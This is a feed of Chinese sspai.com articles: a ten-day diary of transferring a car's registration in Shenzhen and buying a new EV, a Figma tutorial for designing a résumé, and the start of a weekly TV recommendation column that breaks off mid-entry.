[{"title":"十天换车记：粤 B 蓝牌车转籍新能源，从新车预定到上牌开回家","date":"2021-09-25 06:42:16","description":"\n<p>本文从 9 月 10 日到 9 月 20 日，总共十天的操作，重点记录在政府单位办理一个业务的过程，希望可以让有同样业务需求的朋友一定参考。</p>\n<p>这阵子我爸的车问题挺多要卖掉，他在老家上班又要用车，就要把我车转给他；然后我本来不着急换车，既然他要车了，在这节骨眼上我还是不得已要换。我和我爸都是蓝牌车，我是深圳车牌他是广西车牌。所以这次预计要折腾的是：</p>\n<ul>\n<li>我爸卖掉旧车（其实不需要我折腾）</li>\n<li>办理转籍把我的车转给我爸</li>\n<li>更新我的号牌指标</li>\n<li>买车</li>\n<li>上新能源牌照</li>\n</ul>\n<h2>Day 1 转籍申请、预订新车</h2>\n<p>9 月 10 日星期五，到深圳车管所了解程序，之前看知乎等别人写的攻略感觉都没用，根本不用那么麻烦。不用拆牌，不用寄档案，不用上临时牌，不用人肉把档案带回去。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae35b34te12vuoa0g.jpeg\"></figure><p>我感觉车管所大厅是深圳政府单位办事时舒适程度的天花板了。地方宽敞明亮、干净，沙发崭新舒服，空调很凉快。</p>\n<p>工作人员告诉我，车辆转出的业务要么网上预约，现在预约可能三个工作日内都没有号；要么直接在 App 申请，这个是最方便的。所以我直接在车管所大厅用 <strong>交管12123</strong> 直接操作了。</p>\n<h3>要点一：车辆转籍申请由转入方操作</h3>\n<span class=\"ss-application\" app-id=\"16166\"> </span><p>需要特别注意的是，这一步需要机动车购买方来操作，我一开始操作不了这个业务，当场询问工作人员之后才知道不是转出方操作的。把我爸的 App 帐户要过来登录操作：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae3db34te2nr88kg0.jpeg\"></figure><ol>\n<li>首页打开「更多」</li>\n<li>在业务中心点「搜索」栏</li>\n<li>搜索「机动车转籍申请」</li>\n<li>点「机动车所有人变化」</li>\n</ol>\n<h3>要点二：事先开好二手车销售统一发票</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae3lb34te2nr88kgg.jpeg\"></figure><p>在转籍申请的下一步，就是要填写上图的表格，其中有一栏是要上传「二手车销售统一发票」。注意在申请时有提示：<strong>转入地必须与二手车销售统一发票地一致</strong>。也就是说，需要在转入地开好销售发票。刚好我爸在老家附近可以开，花半小时办好，拍照过来，提交完毕。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae3tb34te2nr88kh0.jpeg\"></figure><p>提交后，申请进入左图「受理中」的状态，工作人员告诉我在深圳的事情就办完了，直接把车开回去，等两三个工作日办理完成，车子就可以在转入地重新入户了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae45b34te2hplttj0.png\"></figure><p>转籍的事办完，去商场看了下新车的颜色，交钱下单。</p>\n<h2>Day 2 开旧车回去</h2>\n<p>9 月 11 日星期六，回到老家，和开了七年的车说拜拜。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae4db34te12vuoa10.jpeg\"></figure><h2>Day 3 高铁回深圳</h2>\n<p>9 月 12 日星期天，打工人返回打工地。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae4db34te12vuoa1g.jpeg\"></figure><h2>Day 4 旧车入户、旧号牌转移迁出</h2>\n<p>9 月 13 日星期一，工作日了，这两天转籍申请的记录会有变动，要注意一下。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae4lb34te2r9sas40.jpeg\"></figure><p>转籍不单是要让旧车在老家可以重新入户，也是要让粤B车牌指标可以更新，并且在新车使用这个指标，打开<strong>深圳市小汽车增量调控管理信息系统</strong>： http://xqctk.jtys.sz.gov.cn，选择「更新」登录。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae4tb34te2hplttjg.png\"></figure><p>我不记得有没有注册过。没关系，点「省政务网入口」，会跳转到「广东省统一身份认证平台」，这时用微信扫码，进行一道人脸识别认证就可以登录进去了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae55b34te2hplttk0.jpeg\"></figure><p>点击「我要申请」，填写申请表单，业务类型选择<strong>「转移迁出」</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae5tb34te12vuoa20.jpeg\"></figure><p>是这个状态就可以了。</p>\n<h2>Day 5 新车加快交付</h2>\n<p>9 月 14 日星期二，本来要三到五周的交付周期，理想销售和我说现在加快交付，有可能在中秋前提车。</p>\n<h2>Day 6 新车下线、付款</h2>\n<p>9 月 15 日星期三，销售通知车已经下线，如果付款，等五六天物流就到了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae65b34te2nr88khg.png\"><figcaption>好吧。</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae6db34te2nr88ki0.jpeg\"></figure><p>另外，转移迁出的申请也审核通过了，可以在政务服务网里下载 <strong>更新指标证明文件.pdf </strong>了。这个文件很重要，里面有个指标编号，新车在网上选号时要用到的。</p>\n<h2>Day 6~9</h2>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/09/22/4600192f7650b22bcdb58ee47d1b181b.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/09/22/8fa2cf4539f814216e3b5400282629b0.jpg\" alt=\"\"></figure><p>上班往来陪伴我的是哈啰单车和地铁的强冷车厢。</p>\n<p>这几天里，我爸也在老家办好了旧车的入户，旧车保险让车险的人转好了。</p>\n<p>第九天，理想销售让办保险，第二天带身份证来提车。</p>\n<h2>Day 10</h2>\n<p>9 月 20 日星期一，蹭老麦的 Model Y 来龙华交付中心提车，十几分钟办个临时牌就可以开走了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae75b34te2r9sas50.jpeg\"><figcaption>让交付小姐姐拍张露脐照</figcaption></figure><h2>后续</h2>\n<p>接下来要办的事，要用指标去选车牌，然后到罗湖车管所验车，车牌等一周多寄过来。这个过程可以自己跑，也可以给点钱让代办带着跑。最后自己去把旧车 ETC 改成新车绑定就完事。</p>\n<h2>总结</h2>\n<p>回顾我在深圳政府单位的办事过程，无论是小孩办证、房屋手续、车证业务，每次的感受都是差不多，那就是网上的信息是滞后的，但实际办事的效率会比看各种贴文攻略好不少。</p>\n<p>看其他网友写的东西，即使是一两年内的东西，会觉得太麻烦。如果到办事处去问，工作人员都会很友善耐心和你说，现在已经不需要 XXX 了，只需要在手机上怎样操作，可以节省很多时间和步骤。</p>\n<p>可以看出政府机关确实在办事上不断优化业务流程。至于网上五花八门的办事攻略，只要了解个大概就好，亲身到办事部门或电话去问一下是最高效的。</p>\n<p>注意：本文描述的这一次机动车转籍和提车的体验，其中办事流程只对应文章描述的日期，实际办理过程中可能会有其他情况，而新车交付过程的提前也是预料之外的。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68921"},{"title":"用 Figma 做一份个人简历","date":"2021-09-25 02:43:46","description":"\n<h3>Matrix 首页推荐</h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>在 <a href=\"https://sspai.com/post/67913\" target=\"_blank\">上一篇文章</a> 中我们通过几个简单的封面制作大体上了解了 Figma 的基本操作，今天我们一起来设计一份稍微复杂一点的简历，来学习一下 Figma 中的一些高级操作。</p>\n<h2>构思</h2>\n<p>很多人对设计过程都有一个误解，认为设计师会一直在电脑前画图。其实，做设计中的前期构思也很重要，如果能花很多时间进行完整地构思，最后在软件中画图就是水到渠成。使用 Figma 设计简历也是一样，当你在心中构思好内容、布局、风格之后再动「笔」，在最后设计时就会「文思如泉涌」。所以，在进入 Figma 开始设计之前我先简单讲一下一份简历的构思。</p>\n<h3>内容</h3>\n<p>我们先简单构思一下这份简历的基本内容。一般简历最主要的部分包括基本信息、教育经历、工作（实习）经历和项目经历这四块，当然我们也可以加上个人评价、技能展示等部分，但这些都是锦上添花的内容。其中，实习经历、工作经历和项目经历可以按照 <a href=\"https://baike.baidu.com/item/STAR%25E6%25B3%2595%25E5%2588%2599/9056070\" target=\"_blank\">STAR 法则</a>去写。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572552.png\" alt=\"简历内容结构\"></figure><p>关于个人评价和技能展示这两块，如果一定要写最好挑自己独特的点来写，而不是泛泛而谈。比如个人评价可以说「我是一个兼具感性与理性的人，情感细腻而又逻辑严谨」，而「我是一个富有责任感，乐于助人，学习勤奋的人」这种就显得比较普通而毫无吸引力了。</p>\n<h3>布局</h3>\n<p>简历中有一个「简」字，重在简洁，所以一般建议一页 A4 纸搞定，不必太过冗长。布局的话通常是一栏或两栏，大致按照上面的结构书写即可。如果不是创意工作者，不建议做得过于酷炫，采用常见的布局就可以了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572566.jpg\" alt=\"布局\"></figure><h3>风格</h3>\n<p>简历的风格以适合舒适阅读为准，不需要太花哨，建议一个主色搭配黑白灰。简历的字体用一种就可以了，使用粗细或字号来进行区分不同的模块，方便查阅者阅读。有些简历会通过五颜六色的图案来吸引招聘者阅读，但其实没太大必要，只需要简洁工整，其实就已经在大部分简历中脱颖而出了，因为以我以往阅读简历的经验来看，大部分简历都过于杂乱且很难阅读。</p>\n<p>在这一小节我们最后做出的简历风格如下：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572575.jpg\" alt=\"最终成品\"></figure><h2>开始绘制</h2>\n<p>在构思过程中，你可以先用文档工具把简历内容写出来，写完后我们就可以在 Figma 中开始绘制了。首先我们按下 F 键，在右侧的预置尺寸中选择 Paper -&gt; A4。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572585.jpg\" alt=\"选择 frame 尺寸\"></figure><p>这时在画布中就有了一块 A4 大小的画板，选中它并按下 <code>Cmd+R</code>（Windows 下是 Ctrl+R，下文中快捷键只提供 macOS 的，如无特殊说明 Windows 下请自行将 Cmd 换为 Ctrl 键将 Option 换成 Alt 键），我们就可以给它改个名字了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572595.jpg\" alt=\"改个名字\"></figure><h3>布局参考线</h3>\n<p>想要简历看起来工整，我们需要把基本的对齐做好。一般设计软件中都有参考线，Figma 中也有，但是我要给大家介绍另一个更强大的布局参考工具——布局栅格（Layout and grid）。简单来说，它就是通过一些自定义的行和列来辅助排布元素。</p>\n<p>因为我们的简历是两栏布局，所以我们可以给这张纸添加一个两列的布局参考。选中这张纸，在右侧有一个 Layout grid 的区域，点它就会自动添加一个 Grid 参考，也就是网格参考。可以看到此时左边的画板中出现了红色的网格，这些网格线并非设计元素，只是盖在设计图上面的半透明的参考线，在导出时是不会显示的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572605.jpg\" alt=\"添加布局栅格\"></figure><p>我们要的是列参考，所以点击新添加的 Grid (10px) 这一行，会弹出布局栅格设置面板。我们在顶部将其从 Grid 切换为 Columns，也就是「列」，接着在下面的设置中填写列数、两侧边距和中间间距。设置完成后你会看到有两个半透明的列盖在上面，也就是我们需要的两栏效果。这个参考区域默认是 10% 的红色，如果你觉得这个红色太深了会干扰你的设计，也可以在这个面板中修改颜色不透明度。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572614.jpg\" alt=\"列设置\"></figure><p>同样地，我们点击 Layout grid 最右边的加号，再创建一个行参考。行参考不需要那么复杂，我们直接设置为一行，上下边距设置为 24px 即可。现在我们得到了一个两栏布局的参考区域，并且还得到了四个方向上的边距，接下来我们就可以在画板里面根据这个参考区域添加内容了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572624.jpg\" alt=\"行参考\"></figure><h3>基本信息</h3>\n<p>个人基本信息就是左边一些文字右边一个头像，我们先添加头像。按下 <code>Cmd+Shift+K</code>，它会弹出文件选择器，选择你的头像照片然后在 A4 纸上点一下，你的头像就贴在那了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572634.jpg\" alt=\"贴个头像\"></figure><p>如果头像尺寸很大，我们需要稍微调整一下。选中头像，按住 Shift 键并用鼠标拖拽某个角，就可以等比缩放头像了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572643.jpg\" alt=\"缩放头像\"></figure><p>为了让简历看起来不那么死气沉沉，我准备用圆形的头像。因为我这个头像是正方形的，所以我只需要在右边设置其圆角为宽度的一半就可以了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572653.jpg\" alt=\"设置圆形头像\"></figure><p>如果你的头像是长方形的，你可以按下 Cmd 不松手的同时拖拽短边，将其拉伸为一个正方形。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572663.jpg\" alt=\"拉伸为正方形\"></figure><p>接着按回车，就可以微调尺寸和位置了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572673.jpg\" alt=\"微调尺寸和位置\"></figure><p>现在开始创建一个文本图层来编写基本信息。按下 T，在头像左边点一下创建一个文本图层，输入你的个人信息。你也可以直接复制基本信息到剪切板，按下 <code>Cmd+V</code> 粘贴到画板中。需要注意的是，在粘贴之前一定要先选中简历画板，否则文字会被粘贴到画板之外，导出的时候就看不到它。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572682.jpg\" alt=\"添加基本信息文字\"></figure><p>我们稍微调整一下文字排版，让它更容易阅读。首先设置为一个好看的中文字体，我是用云端字体 Noto Sans SC，你也可以用你喜欢的中文字体；接着，调整一下字号，经过几番实验 10px 比较合适；最后，设置一下行高，我这里输入的是 18px。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572691.jpg\" alt=\"调整排版\"></figure><p>接下来我们选中名字这一行，将其字号加大到 16px 并加粗，并调整为一个自己喜欢的主题色，我选择蓝色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572700.jpg\" alt=\"强调名字\"></figure><p>Figma 画布中的文字是可以添加链接的，现在让我们给邮箱添加链接，方便别人点击给我们发邮件。选中你的邮箱，直接按下 Cmd+C，再按一下 Cmd+V 就可以了，此时邮箱下面会有下划线，如果退出编辑模式（按下 ESC）把鼠标移到上面，可以看到链接提示。当然你也可以选中文字之后按下 Cmd+K 来添加链接。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572709.jpg\" alt=\"添加链接\"></figure><p>现在，我们调整一下基本信息和头像的位置，将其对齐。在你移动图层时，会显示红色的线来告诉你是否对齐。这样我们就可以很轻松地把文字和邮箱对齐到我们一开始创建的两栏布局中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572718.jpg\" alt=\"对齐基本信息\"></figure><p>现在，选中文字和头像（你可以按住 Shift 点击图层多选，也可以直接在画板中拖拽框选），按下 <code>Cmd+Option+G</code>，将其打包为一个 frame。按下 <code>Cmd+R</code>，给这个 frame 重命名为「基本信息」。<strong>Frame 是一个容器，我们可以给它添加背景色调节它的尺寸等，这方便我们按模块管理图层。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572729.jpg\" alt=\"打包基本信息\"></figure><h3>教育经历</h3>\n<p>接下来，我们绘制教育经历。同样地，直接将文字复制进来，然后稍微调整一下样式。首行标题设置为 14px 大小，加粗并改为主题色。下面的两行文字可以使用列表样式，选中它们，点击右边文字设置右下角的三个点，在弹出的更多设置中设置列表样式。</p>\n<p>当然，你也可以直接使用 Markdown 语法，输入 - 或者 * 然后按空格键，将这一行文字变为列表样式。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572739.jpg\" alt=\"添加教育经历\"></figure><p>同样地，我们也按一下 <code>Cmd+Option+G</code> 将其打包为一个 frame，然后重命名为「教育经历」。然后，拖拽右边把它拉到和画板一样宽。你可能会好奇为什么只有一个文本图层也要打包成一个 frame，这是因为我们在 Figma 中养成使用 frame 把元素打包成一个个模块的好习惯，会让设计稿更容易维护，也会使很多事情变得简单。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572747.jpg\" alt=\"打包教育经历\"></figure><h3>工作经历</h3>\n<p>现在我们一起绘制左边的工作经历。还是一样地将文字复制进来，然后拖拽文本两侧将其对齐到左边这一栏。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572755.jpg\" alt=\"工作经历文字\"></figure><p>接着逐个调整文字样式，标题还是和教育经历的保持一致，14px 加粗并使用主题色。每一段工作经历的标题加粗，并使用换行区分开来，公司（职位）和时间之间使用空格隔开，使其看起来像是两端对齐，并给网址添加链接。这样，我们的工作经历就做好了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572763.jpg\" alt=\"给工作经历添加样式\"></figure><p>选中这个文本图层，按下 <code>Cmd+Option+G</code> 将其打包为一个 frame，重命名为「工作经历」。如果此时你修改了内部的文字内容，这个 frame 的尺寸并不会跟着文字变化，你可以点击右上角的这个图标来让 frame 适应内容。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572771.jpg\" alt=\"适应内容\"></figure><h3>项目经历</h3>\n<p>项目经历和工作经历类似，此处不再赘述。在你画好之后，记得让工作经历和项目经历上面对齐。你可以拖动时观察红色指示线来对齐，也可以选中这两个模块，按下 Option+W 对齐。</p>\n<blockquote><p>Figma 中可以使用 <code>Option+A/S/W/D</code>（游戏的方向键）来朝四个方向对齐。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572780.jpg\" alt=\"对齐它俩\"></figure><p>在设计的过程中你需要时不时地看效果，如果 Layout grid 影响了观察设计你可以把它关掉。点击右上角视图比例，在下拉菜单中点击 Layout grids 就可以关掉了，再次点击可以开启，你也可以按快捷键（macOS 下是 <code>Ctrl+G</code>，Windows 下是 <code>Ctrl+Shift+4</code>）来快速开启关闭。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572788.jpg\" alt=\"关掉 Layout grids\"></figure><h3>个人描述和更多信息</h3>\n<p>我们可以在最后添加「关于我」和「更多」的模块。「关于我」和上面的操作类似，不再多说。这里特别说一下「更多」中的那个箭头，这其实是两个字符：「-」 和 「&gt;」。我们可以使用自带的 OpenType 字体 <a href=\"https://rsms.me/inter/\" target=\"_blank\">Inter</a> 把它俩连在一起。输入「-&gt;」，选中它并将它切换为 Inter 字体，点击三个点在更多设置中找到 <a href=\"https://www.typenetwork.com/news/article/opentype-at-work-contextual-alternates\" target=\"_blank\">Contextual alternates</a>，点击后面的勾即可。Contextual alternates 是一种 OpenType 字体特性，也叫做「上下文连字」，可以<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Fonts/OpenType_fonts_guide%23%25E8%25BF%259E%25E5%25AD%2597%25EF%25BC%2588cssxref(font-variant-ligatures)%25EF%25BC%2589\" target=\"_blank\">在特定情况下将多个字符连到一起变为一个新的字符</a>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572815.jpg\" alt=\"添加箭头\"></figure><p>最后这两个模块内容不一样，但是我们可以把 frame 拉伸为一样大小，方便后续对齐。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572825.jpg\" alt=\"拉伸为一样大小\"></figure><h3>快速排布</h3>\n<p>选中简历中的所有模块，在右下角会出现一个蓝色图标，点击它可以帮我们快速排布元素。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572833.jpg\" alt=\"自动排布\"></figure><p>点击之后会显示很多粉红色的线和圆点，可以帮助我们调整排版。<strong>拖拽粉红色圆点可以互换元素位置，拖拽粉红色的线可以调节横向和纵向间距</strong>，当然我们也可以在右边输入框里面调节。这就是为什么我们前面使用 frame 打包每一个部分的原因，因为这样将元素打包成模块并适当调整尺寸，我们就可以使用这个快速排布来调整间距和位置。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572841.jpg\" alt=\"微调排布\"></figure><h2>发送和导出</h2>\n<p>简历做好之后，可以通过分享链接发送给别人。选中简历，点击右上角的分享，在分享面板中设置 Anyone with the link can view（任何人知道链接就能打开），也可以设置邮箱邀请可见，然后复制链接发送即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572849.jpg\" alt=\"分享链接\"></figure><p>不过，这种方式可能打不开或者打开很慢，我们也可以选择导出 PDF。选中简历，在右侧滚动到最下面的 Export，添加一个 Export，设置格式为 PDF，点击按钮导出。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572858.jpg\" alt=\"导出 PDF\"></figure><p>如果你的 PDF 有多页，可以按下 <code>Cmd+P</code>，搜索 PDF，在下面的选项中选择 Export frames to PDF，就可以导出当前页面中的所有画板为一个 PDF 了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572868.jpg\" alt=\"导出多个页面\"></figure><p>从 Figma 导出的 PDF 文字可以选择，链接可以点击，还是挺不错的，不过就是有点大，可以去 <a href=\"https://smallpdf.com/compress-pdf\" target=\"_blank\">Smallpdf</a> 压缩一下。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572879.jpg\" alt=\"导出的 PDF\"></figure><p>现在，开始投递你的简历吧。</p>\n<p><strong>本文源文件：</strong><a href=\"https://www.figma.com/file/0kgC960LDLmzeJcW3RVFs8/Let's-Figma?node-id=272%3A12\" target=\"_blank\">https://www.figma.com/file/0kgC960LDLmzeJcW3RVFs8/Let's-Figma?node-id=272%3A12</a><strong> ，如需使用请点击 Duplicate 菜单复制一份，不要申请编辑。</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_leadream/16324419572887.jpg\" alt=\"复制文件\"></figure><p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派会员？<a href=\"https://sspai.com/prime\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68950"},{"title":"本周看什么丨最近值得一看的 9 部作品","date":"2021-09-24 09:31:22","description":"\n<h2>☕️ TL;DR</h2>\n<ul>\n<li>近期佳作推荐：[英剧] 性爱自修室 第三季、[美剧] 早间新闻 第二季、[韩剧] 鱿鱼游戏、[纪录片] 无穷之路、[动画] 星球大战：幻境、[英剧] 万物生灵 第二季、[美剧] 失落的秘符、[纪录片] 转折点：911 与反恐战争、[韩剧] 柔美的细胞小将</li>\n<li>几则精彩预告：汤姆·汉克斯主演新片《芬奇》11 月 5 日上线 Apple TV+、本尼迪克特·康伯巴奇主演《路易斯·韦恩的激情人生》11 月 5 日上线 Prime Video、布兰妮纪录片《Britney Vs. Spears》9 月 28 日在 Netflix 上线</li>\n<li>几则影视资讯：《沙丘》内地定档 10 月 22 日、《007：无暇赴死》内地定档 10 月 29 日、许鞍华新作《第一炉香》正式定档 10 月 22 日中国内地上映、《神奇动物 3：邓布利多之谜》北美提档 2022 年 4 月 15 日上映、《马力欧》动画电影将于 2022 年上映</li>\n</ul>\n<h2>👀 N 部作品推荐</h2>\n<p>根据读者反馈，如果推荐语涉及剧透（对故事核心、暗线、伏笔、结局等关键要素的透露），我们会在对应作品的标题前增加 🔦 的 Emoji。</p>\n<p>如有其他建议也欢迎在评论区提出，感谢大家对「看什么」栏目的喜爱和支持。</p>\n<h3>[英剧] 性爱自修室 第三季</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/1c14ac9bfdcdfae0bedadda453227e86.png\"></figure><p>关键词：剧情 / 成长 / 校园</p>\n<p>片长：约 60 分钟（单集）× 8 集；<a href=\"https://movie.douban.com/subject/34966169/\">豆瓣链接</a></p>\n<blockquote><p>一部自由主义的乌托邦，一次认识自我的小旅行。</p></blockquote>\n<p>@宽治：《性爱自修室》第三季以一段万花筒式的「性爱混剪」迎来了自己的回归，也暗示了剧集对多样性的关注。在这一季中，莫戴尔高中的同学们继续探索着各种各样的性关系，但实际上，以性为线索，我们看到的是作为人的丰富性。本剧的一个核心观点就是，每个人都有权按照自己希望的样子展现、发展自己，而在众多自我表达的渠道中，性表达（包括你的性别身份、性癖好等）也许是最为特别且真诚的一种。</p>\n<p>在第三季中，多元主义与自由主义的视角得到了进一步的强化，很多角色包括新加入的角色都展现出了更多的可能性：亚当发现自己喜欢上了艾瑞克、卡尔积极地想要确立「非二元性别者」的合法性、珍与雅各布寻找着适合他们的中年关系、奥蒂斯尝试新的恋爱方式、梅芙努力直面自己和世界的关系……但本剧对「认识并接受真我」的追求，似乎偶尔也会变成一种「执拗」，而那些曾经很好地隐藏在情节之中的「教育意义」，在第三季中则变得有些过于明显。每一个人在面对问题时，最终都选择了正确的道路，很多谈话也变成了初级心理学知识的宣讲，显得有些生硬，但瑕不掩瑜，第三季仍然值得一看。（P.S. 我个人很心水这一季的配乐选择，感觉很到位。）</p>\n<h3>[美剧] 早间新闻 第二季</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/3eb136800c4076c69c07e09aa073a1f5.png\"></figure><p>关键词：剧情</p>\n<p>片长：60 分钟（单集）× 10 集</p>\n<p>观看渠道：<a href=\"https://tv.apple.com/us/show/the-morning-show/umc.cmc.25tn3v8ku4b39tr6ccgb8nl6m)\">Apple TV+</a> ；<a href=\"https://movie.douban.com/subject/34882957/\">豆瓣链接</a></p>\n<p>@宇宙浪费指南：期待已久的《早间新闻》第二季回归了，在疫情期间拍摄的第二季新闻故事，可想而知会更混乱、更魔幻。第二季保持了第一季的水准，但是在 10 集的体量里如何承载新冠、弗洛伊德事件、大选等事件，以及主角团的各自故事展开还是蛮值得期待的。</p>\n<p>该剧的看点还在于新闻事件对个人命运的影响、职场人际关系等，两个女主角大概又要同框主持同一节目了，两个人的关系如何发展也很令人好奇，究竟是算计、沟通，还是建立友好合作关系，甚至建立起情感关联都不得而知。</p>\n<p>瑞希·威瑟彭斯饰演的 Bradley 还是像初出茅庐的职场新人一样冲动、不计后果，但充满了对新闻的热爱和坚持，她也学会为了想要的东西做一些妥协；而安妮斯顿饰演的 Alex 在上季退出 UBA 后隐居雪乡别墅开始写书，书里的红舞鞋故事简直是这剧走向的明示了。Cory 在两个人之间斡旋，不知道他在谋划什么，但也可预料到这季会是三人的重头戏了。</p>\n<h3>[韩剧] 鱿鱼游戏</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/89f73667a8928ff3cb3787064cb27b22.png\"></figure><p>关键词：悬疑 / 惊悚</p>\n<p>片长：60 分钟（单集）× 9 集</p>\n<p>观看渠道：<a href=\"https://www.netflix.com/title/81040344\">Netflix</a> ；<a 